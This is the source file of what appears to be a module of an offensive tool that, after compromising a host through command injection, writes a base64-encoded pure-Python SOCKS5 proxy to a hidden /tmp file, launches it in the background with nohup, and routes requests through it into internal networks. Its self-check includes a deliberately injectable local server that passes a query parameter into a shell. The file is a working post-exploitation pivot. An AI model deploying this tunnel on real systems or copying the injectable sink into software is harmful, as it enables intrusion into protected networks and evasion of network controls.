"""SOCKS tunnel through the foothold — route Watson's traffic via the compromised host.

A tiny pure-Python SOCKS5 proxy is written to the foothold and started through the
exec channel; Watson then sends requests with socks5h://<foothold>:<port>, so probes
reach internal hosts *through* the foothold. No binary/arch issues (the foothold has
python). ponytail: CONNECT only, no auth — enough to pivot web/TCP.
"""
from __future__ import annotations

import base64
import time

# Minimal SOCKS5 (no-auth, CONNECT) relay. Deployed to the foothold and run there.
SOCKS_SERVER = r"""
import socket,threading,struct,sys
def pipe(a,b):
 def fwd(s,d):
  try:
   while True:
    x=s.recv(4096)
    if not x:break
    d.sendall(x)
  except Exception:pass
  finally:
   try:d.shutdown(socket.SHUT_WR)
   except Exception:pass
 t=threading.Thread(target=fwd,args=(a,b),daemon=True);t.start();fwd(b,a)
def handle(c):
 try:
  c.recv(262);c.sendall(b"\x05\x00")
  h=c.recv(4)
  if len(h)<4:return
  cmd,atyp=h[1],h[3]
  if atyp==1:addr=socket.inet_ntoa(c.recv(4))
  elif atyp==3:addr=c.recv(c.recv(1)[0]).decode()
  elif atyp==4:addr=socket.inet_ntop(socket.AF_INET6,c.recv(16))
  else:return
  port=struct.unpack(">H",c.recv(2))[0]
  if cmd!=1:c.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00");return
  try:r=socket.create_connection((addr,port),timeout=10)
  except Exception:c.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00");return
  c.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00");pipe(c,r)
 finally:
  c.close()
def main():
 p=int(sys.argv[1]) if len(sys.argv)>1 else 1080
 s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",p));s.listen(50)
 while True:
  c,_=s.accept();threading.Thread(target=handle,args=(c,),daemon=True).start()
main()
"""


def open_socks(channel, host: str, port: int = 1080, remote_path: str = "/tmp/.ms_socks.py") -> dict:
    """Deploy + start the SOCKS proxy on the foothold; return a requests `proxies` dict."""
    b64 = base64.b64encode(SOCKS_SERVER.encode()).decode()
    channel.run(f"echo {b64} | base64 -d > {remote_path}")
    channel.run(f"nohup python3 {remote_path} {port} >/dev/null 2>&1 & echo started")
    time.sleep(1.2)  # let it bind
    proxy = f"socks5h://{host}:{port}"
    return {"http": proxy, "https": proxy}


if __name__ == "__main__":  # self-check: python -m watson.pivot (real tunnel, local)
    import subprocess
    import threading
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from urllib.parse import parse_qs, urlparse

    import requests

    from .exec_channel import CommandInjection

    # "internal" service — only to be reached through the tunnel
    class Intern(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"INTERNAL-OK")

        def log_message(self, *a):
            pass

    internal = HTTPServer(("127.0.0.1", 0), Intern)
    iport = internal.server_address[1]
    threading.Thread(target=internal.serve_forever, daemon=True).start()

    # "foothold" — a command-injection sink that runs commands on this host
    class RCE(BaseHTTPRequestHandler):
        def do_GET(self):
            host = parse_qs(urlparse(self.path).query).get("host", [""])[0]
            self.send_response(200)
            self.end_headers()
            self.wfile.write(subprocess.getoutput("echo r: " + host).encode())

        def log_message(self, *a):
            pass

    rce = HTTPServer(("127.0.0.1", 0), RCE)
    threading.Thread(target=rce.serve_forever, daemon=True).start()
    ch = CommandInjection(requests.Session(), f"http://127.0.0.1:{rce.server_address[1]}/x", "host")

    sport = 10800
    proxies = open_socks(ch, "127.0.0.1", sport)
    # reach the internal service THROUGH the foothold's SOCKS proxy
    r = requests.get(f"http://127.0.0.1:{iport}/", proxies=proxies, timeout=10)
    assert r.text == "INTERNAL-OK", r.text
    internal.shutdown()
    rce.shutdown()
    print("pivot self-check ok  (tunnel established)")
